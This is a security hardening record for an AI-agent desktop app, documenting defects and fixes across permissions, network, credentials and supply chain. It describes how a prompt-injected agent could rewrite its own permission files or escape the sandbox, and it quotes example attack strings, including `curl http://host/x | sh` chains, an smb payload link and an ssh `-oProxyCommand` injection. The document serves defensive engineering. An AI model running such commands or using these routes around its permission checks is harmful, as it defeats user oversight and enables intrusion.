# Security Hardening Record

Record of a full-codebase security review and the fixes it produced. Kept as a
reference for why these controls exist, so they are not "simplified" away later.

Each entry states the defect, the fix, and the enforcement point. For the
user-facing view of these controls, see the [Security Guide](security-guide.md);
for the permission layers specifically, see the
[Permission System](permission-system.md).

## Configuration changes that can break an existing setup

Read this section first if a channel or install stopped working after upgrading.

| Change                                                      | Effect                                                                                                                         | What to do                                                                     |
| ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------ |
| Feishu callback credentials are mandatory                   | The Feishu webhook server refuses to start, and rejects events, when neither **Encrypt Key** nor **Verification Token** is set | Add either value from the Lark app's Event Subscriptions page                  |
| WeCom callback signature always verified                    | Plaintext callbacks without a valid `msg_signature` are rejected even when no EncodingAESKey is set                            | Keep the callback **Token** correct; configuring EncodingAESKey is recommended |
| Telegram webhook mode requires a secret token               | Returns `503` until `secretToken` is configured (long-polling mode is unaffected)                                              | Set a secret token if using webhook mode                                       |
| Cron webhook requires a secret                              | Returns `503` until a secret is configured; the body-borne `secret` field is no longer accepted, header only                   | Send `X-Webhook-Secret`                                                        |
| MCP registry URL must be `https://`                         | A `http://` registry URL is rejected by settings validation                                                                    | Use an `https://` registry                                                     |
| Installing a **remote** MCP server prompts for confirmation | A dialog shows the exact command, arguments, and env keys before anything is spawned                                           | Review and approve. Bundled connectors are unaffected                          |
| Workspace policy files are read-only to tools               | Tools cannot write `.cowork/policy/**` or `.git/**` inside a workspace                                                         | Edit policy from Settings, or by hand outside the agent                        |
| Manifest `allow` rules need a local mirror                  | `allow` rules in a checked-in `.cowork/policy/permissions.json` do not apply until approved on this machine                    | Approve the action once; `deny`/`ask` rules still apply immediately            |

## Agent and permission boundaries

### Workspace policy files are no longer agent-writable

`.cowork/policy/permissions.json` (the permission mirror) and
`.cowork/policy/tools.monty` (the tool-policy script) decide whether a tool call
is allowed — and they live inside the workspace the agent can write. A
prompt-injected agent could grant itself `run_command` by writing one JSON file,
with no prompt shown. `.git/**` was equally writable, and a git hook executes on
the next commit, outside the tool sandbox entirely.

Both are now protected mutation boundaries alongside the OS locations already listed
in `PROTECTED_FILESYSTEM_ROOTS`:

- Enforced in `evaluateWorkspaceFilesystemAccess`
  (`src/electron/security/access-profile-paths.ts`) via
  `PROTECTED_WORKSPACE_SEGMENTS` and `isProtectedWorkspacePath`.
- Denied with reason `protected_path`, which is in
  `HARD_FILESYSTEM_BOUNDARY_REASONS` — it cannot be satisfied by an approval or
  by a rule.
- Matched per path **segment**, so a nested repository's `.git` (submodules,
  vendored checkouts) is covered too, and compared against both the lexical and
  the canonical workspace root so a symlink cannot launder the write.
- Reads are still allowed; only write and delete are blocked.
- One carve-out: `.git/info/exclude`, which is a list of ignore patterns with no
  execution or credential semantics and which CoWork maintains itself to keep
  its scratch directories out of `git status`.

### Checked-in permission manifests are untrusted input

The manifest is a _mirror_ of the workspace's SQLite rules, so anything with
workspace write access can author it — including the agent, and including a
repository that was merely cloned. `filterTrustedManifestRules`
(`src/electron/security/workspace-permission-manifest.ts`) now applies:

- `deny` and `ask` rules are honoured as-is; they can only narrow access.
- `allow` rules are honoured only when the workspace database holds an
  equivalent rule, which is what the approval flow writes alongside the manifest
  entry. Ignored grants are logged once per workspace.

See [Manifest trust](permission-system.md#manifest-trust) for the operational
detail.

### Copies no longer inherit the executable bit

`fs.copyFile` carries the source's mode, and every git repository ships
`.git/hooks/*.sample` at `0755`. "Copy a sample hook, then overwrite it" was a
way to create an executable without ever setting a mode. `copy_file` now strips
the executable bits from the destination (`FileTools.stripExecutableBits`).

### Write-tool classification has one source of truth

Several hand-maintained "does this tool mutate?" tables gated different layers of
the same pipeline, and had drifted from the canonical taxonomy. Five tools
declared in `TOOL_GROUPS["group:write"]` — `organize_folder`, `compile_latex`,
`monty_transform_file`, `batch_image_process`, `scratchpad_write` — classified as
read-only, so they were auto-allowed in default mode and permitted in Plan mode,
whose documented guarantee is that it does not mutate.

`isCanonicalWriteToolName` (`src/electron/agent/tool-semantics.ts`) derives from
`TOOL_GROUPS["group:write"]` and `["group:destructive"]`, and is consulted first
by both `PermissionEngine.isWorkspaceWriteTool` and `tool-policy-engine`'s
`isMutatingTool`. A regression test asserts every member of those groups
classifies as mutating, so adding a tool to a group cannot reopen the gap.

### Trusted-command patterns cannot span shell operators

Trusted patterns describe one command, but the glob-to-regex conversion turned
`*` into `.*`, which spans shell operators — with the shipped default `echo *`,
`echo ok && curl http://host/x | sh` matched and auto-approved. Two fixes:

- `containsShellControlOperator` (`src/electron/guardrails/guardrail-manager.ts`)
  makes any chained, piped, substituted, or redirected command line ineligible
  for pattern trust; the user is prompted instead.
- The trusted branch in `shell-tools.ts` now also requires
  `safeForAutoApproval`, which the adjacent auto-approve branch already required.
  Without it, a command bearing `rm` or `sudo` auto-approved whenever some
  trusted prefix matched.

### Approval reuse no longer spans different programs

The recent-approval window keyed on a signature that collapsed quoted arguments
to `"<arg>"` and absolute paths to `<path>`. That is desirable for a batch
(`sips … A.png`, `sips … B.png` share one approval) but wrong when the argument
_is_ the program: `sh -c "npm test"` and `sh -c "curl http://host/a | sh"`
collapsed to the same key, so approving a test run auto-approved arbitrary code
for the rest of the window.

Normalization is retained, except for command lines containing shell operators
and those whose executable is an interpreter (`INTERPRETER_EXECUTABLES`: `sh`,
`bash`, `python`, `node`, `sudo`, `env`, `osascript`, …). Those are keyed
verbatim and only ever match a byte-identical repeat.

### LaTeX compilation no longer executes workspace Perl

`latexmk` evaluates `./latexmkrc` and `./.latexmkrc` from its working directory
as Perl, and that directory holds the agent-authored `.tex` file. `compile_latex`
now passes `-norc`, and `-no-shell-escape` for every engine, so neither a
resource file nor `\write18` inside the document can run commands.

## Network boundaries

### Agent fetches cannot reach internal addresses

Network decisions were made purely on hostname strings, with no address-class
check anywhere, so an agent-supplied URL could reach cloud instance metadata
(`169.254.169.254`) and private ranges from the user's host and relay the
response back into model context.

`src/electron/security/address-classes.ts` is now the single implementation of
address classification, extracted from `ipc/handlers.ts` where it had been
module-private (which is why the agent fetch path grew its own policy without
it). Two layers:

- **Synchronous**, in `evaluateNetworkPolicy`, checked before any allow rule so
  an allowlist entry cannot open it: link-local (including metadata), private
  RFC-1918 ranges, carrier-grade NAT, unique-local IPv6, the unspecified
  address, IPv4-mapped forms, and `*.internal` / `metadata` hostnames.
- **Asynchronous**, in `web-fetch-tools`' redirect loop, resolving the hostname
  so a DNS name pointing at an internal address is refused — re-checked on every
  redirect hop.

**Loopback stays reachable.** The agent legitimately fetches dev servers it
starts, and the app's own loopback services all require bearer tokens, so
loopback is the low-value target; metadata and private-range access is the real
risk. Callers opt in via `isBlockedInternalHost(host, allowLoopback)`.

### `shell.openExternal` has one scheme allowlist

`openExternal` invokes the registered handler for whatever scheme it is given, so
`smb://host/share/payload.exe` or `file:///…` becomes a one-click launch. The IPC
channel restricted schemes; the `setWindowOpenHandler` and `will-navigate` paths
did not — and they are reachable from unsanitized `.docx` hyperlink targets,
since the document converter performs no href validation.

All three paths now route through `openExternalIfSafe`
(`src/electron/security/safe-external-url.ts`), which permits only `http:`,
`https:`, and `mailto:`. The app-origin test was also replaced with a parsed
origin comparison plus a path-separator boundary: the previous
`startsWith(appUrl)` also matched `http://localhost:5173.attacker.tld` and a
sibling `…/renderer-evil/` directory.

### Inbound webhooks fail closed

Several channels wrapped signature verification in `if (secret)`, so an
unconfigured credential meant "accept everything". Because these listeners bind
all interfaces and are meant to be publicly exposed, and inbound messages reach
the router and can start agent tasks with an attacker-chosen sender identity,
they now refuse to serve rather than skip the check. See the table at the top for
per-channel effects.

Related: the `/approve` text command's requester check applied only when
`contextType === "group"`, so a 1:1 message could satisfy someone else's pending
approval — which is exactly the tool-permission gate. It now applies in every
context.

### The hooks server authenticates before side effects

`handleRequest` emitted its `request` event _before_ verifying the token. That
event is not just logging: it reaches `EventTriggerService`, where a
webhook-source trigger with no conditions fires on any request and can create a
task. Since the server binds loopback, this was reachable from any web page the
user visited via a bare `<img src="http://127.0.0.1:9877/hooks/x">` — the `401`
and CORS only stop the attacker reading the response, not causing the effect.
Verification now precedes the emit.

## Credentials and transport

### TLS certificate pinning was inverted

`checkServerIdentity` returned `false` on a fingerprint mismatch and `true` on a
match. Node's contract is the opposite: return an `Error` to reject, `undefined`
to accept — so a mismatched certificate was **accepted** and the correct one was
rejected. Because supplying the callback also replaces Node's default hostname
check, enabling pinning _removed_ verification rather than adding to it, and the
client sends the control-plane token immediately after the handshake.

The root cause is worth recording: `@types/ws` declares
`checkServerIdentity?(servername: string, cert: CertMeta): boolean`, but `ws`
never calls it — it forwards the options to `tls.connect`, where the parameter is
a `PeerCertificate` and the contract is `Error | undefined`. Following the
declared type produced the bug.

`pinnedServerIdentity` (`src/electron/control-plane/remote-client.ts`) now calls
`tls.checkServerIdentity` first, then compares fingerprints, returning `Error` or
`undefined`. `asWsCheckServerIdentity` casts at the boundary with the reason
documented. Both previously duplicated call sites use the one helper.

### `config.get` no longer returns the admin token

The handler was commented "sanitized; no secrets" but returned the settings
verbatim, including `token` (the admin credential), `nodeToken`, and per-device
tokens — at `read` scope, which is what companion node clients hold. That made a
low-privilege node token exchangeable for full admin scope.

Both copies now wrap the payload in `redactObjectSecrets`. Redaction is applied
unconditionally, which also keeps the token out of `cowork doctor --json` stdout.
The accessor was renamed `loadSettingsWithSecrets` because the old name invited
the bug, and the raw settings are kept separately for the deployment-posture
check, which inspects real token values.

### App-level settings encryption

The PBKDF2 arguments were semantically inverted: a hardcoded constant shared by
every installation occupied the _password_ position and the per-install machine
ID occupied the _salt_ position. Worse, when the machine ID could not be
established the fallback derived it from two well-known paths plus a constant,
making the key computable by anyone who knew the platform's default user-data
location.

The current format is `app2:`:

- Key derived with the machine ID as the password and a **random per-record
  salt** stored with the ciphertext, PBKDF2-SHA512 at 210,000 iterations.
- No path-derived fallback. If no machine identifier can be established, writing
  secure settings **fails closed** rather than encrypting with a public key.
- Legacy `app:` records are still readable and are **re-encrypted to `app2:` on
  the next successful load**, so upgrades migrate in place.
- The `checksum` column now covers the ciphertext, not the plaintext. An unkeyed
  SHA-256 of the plaintext stored beside the ciphertext is a brute-force oracle
  for low-entropy secrets; plaintext integrity is already guaranteed by
  AES-GCM's auth tag. Both forms are accepted on read so existing rows verify.

The CLI's independent reader (`src/cli/local-control-plane-discovery.ts`) was
updated in lockstep and supports both formats.

## Supply chain

### Remote MCP registry entries cannot silently supply a spawn command

`installServer` copied `command`, `args`, and `env` straight from the registry
response, and the only validator returned early for anything that was not
`installMethod: "manual"`. The remote registry is enabled by default, and
`mergeLocalConnectors` _appended_ bundled connectors only when the id or name was
absent — so a remote entry named `linear`, `jira`, or `figma` shadowed the
shipped connector and supplied its own command. The agent's `integration_setup`
tool reaches this without a prompt.

Three layers now:

1. **Bundled wins.** `mergeLocalConnectors` keeps bundled connectors and drops
   colliding remote entries.
2. **Confirmation.** Installing an entry whose provenance is remote requires
   user approval through `setInstallConfirmationHandler`, showing the exact
   command, arguments, env keys, publisher, and transport. **Fails closed:** with
   no handler registered, the install is refused. This gates the marketplace and
   the agent tool alike.
3. **Provenance is stamped, not inferred.** Entries are tagged `bundled` or
   `remote` during registry assembly (`REGISTRY_ENTRY_PROVENANCE`), in both
   `mergeLocalConnectors` and `getBuiltinRegistry`. Anything unstamped is treated
   as remote. An earlier revision inferred "remote" from the absence of an
   id/name collision, which meant an entry reusing a bundled id skipped the
   prompt — found by driving the running app, not by the unit tests.

`validateRemoteTransportEntry` also applies the http(s) scheme check to every
install method, not just `manual`.

### Update artifacts can be signature-verified

Neither shipped platform is code-signed: macOS packages ad-hoc via
`COWORK_MAC_UNSIGNED=1`, and Windows has no `publisherName`, which makes
electron-updater's own `verifySignature` return early without checking anything.
That left the `sha512` in `latest.yml` as the only integrity control — and it is
published to the same GitHub release as the artifact it describes, so anyone able
to replace one can replace both.

A detached Ed25519 signature scheme is now in place and is verified before
install. It requires no code-signing certificate. **It ships inert** until a
signing key is generated — see [Release Signing](release-signing.md).

### Plugin packs

`parseGitUrl` accepted `http://`, the network policy inspects hostnames but not
schemes, and there is no signature or pinned checksum on this path — while the
cloned tree's entry point is `require()`d into the Electron main process. Now:
`https://` only, `http.followRedirects=false` and an empty `credential.helper` on
the clone, and `manifest.main` resolved and confined to the pack root so
`"main": "../../../evil.js"` cannot escape the directory the install-time scanner
hashed.

`declarative-connector-loader.ts` carries a prominent warning instead of a fix:
its shell template and `vm` context execute manifest content and are not a
sandbox. That is currently acceptable only because a hostile pack already has
code execution via its entry point, and neither handler has a live caller. Do not
expose them to a marketplace, a remote catalog, or agent-authored config without
replacing the shell template with an argv allowlist and the `vm` context with a
real isolate.

## Other

- **Renderer HTML preview.** The file viewer's `.html` preview iframe combined
  `allow-scripts` with `allow-same-origin` on a `srcDoc` frame, which keeps the
  embedder's origin and so gives an arbitrary workspace `.html` file access to
  `window.parent.electronAPI`. `allow-same-origin` was removed, matching the
  other preview frames.
- **Tray quick input.** Progress and error messages interpolated agent-authored
  text (LLM plan step descriptions, tool error output) into `innerHTML` in a
  `data:` document with no CSP. Both callers now escape, and the document has its
  own CSP.
- **File-viewer IPC.** Four channels accepted a `workspacePath` from the renderer
  and then checked containment _against that same value_, so any ancestor
  directory satisfied it. The root is now resolved from the workspace database.
- **SSH tunnel.** `spawn` uses an argv array, so there was no shell injection —
  but `${username}@${host}` is a bare positional argument, and OpenSSH parses a
  leading `-` as an option, where `-oProxyCommand=` executes its value via
  `/bin/sh`. Both fields are now charset-validated, and `testConnection`
  validates at all (it previously went straight to `spawn`).
- **Pulse worker.** `summary()` compared against `` `Bearer ${env.ADMIN_TOKEN}` ``,
  so an unconfigured deployment accepted `Authorization: Bearer undefined`. It
  now rejects when the secret is unset and compares digests.
- **CI.** `permissions: contents: read` added as the default token scope.
- **Dead code.** `SecurityPolicyManager` is documented as not wired up — live
  decisions are made by `monty-tool-policy.ts`, `ToolPolicyPipeline`, and
  `PermissionEngine`. Do not add checks there expecting them to take effect.

## Known gaps

- **The gitleaks download in CI is not pinned by digest.** GitHub permits
  deleting and re-uploading a release asset under the same name, so the version
  tag alone does not identify those bytes, and the binary is installed onto
  `PATH` and executed on every push to `main`. A `TODO` in
  `.github/workflows/ci.yml` carries the checksums URL; filling it in is a
  one-line change.
- **Update signing is inert** until a key is generated. See
  [Release Signing](release-signing.md).
- **Loopback SSRF remains possible** for agent fetches, by deliberate choice
  documented above.
- **The email channel's security mode is forced to `open`**, so authorization
  rests entirely on the optional `allowedSenders` filter. This is reflected
  consistently in the UI and was treated as a product decision rather than a
  defect, but anyone who knows the connected mailbox address reaches the agent
  when that filter is empty.

## Verifying these controls

Automated coverage lives beside each module: `access-profile-paths.test.ts`,
`workspace-permission-manifest.test.ts`, `address-classes.test.ts`,
`safe-external-url.test.ts`, `ssh-tunnel-arg-safety.test.ts`,
`registry-entry-provenance.test.ts`, `mutating-tool-classification.test.ts`,
`shell-control-operators.test.ts`, `file-tools-protected-paths.test.ts`,
`batch-image-tools-watermark-argv.test.ts`, and the TLS-pinning cases in
`remote-client.test.ts`.

Run the full gate before relying on any of this:

```sh
npm run build:electron   # stricter than type-check; catches errors it misses
npm run type-check
npm run lint
npm run test
```

The MCP confirmation dialog is a native modal and cannot be asserted from the
renderer. To exercise it end to end, drive the app with Playwright's `_electron`,
reach the main process with `process.mainModule.require`, and — for the native
sheet itself — enable `app.setAccessibilitySupportEnabled(true)` at runtime so
macOS System Events can read and click it.
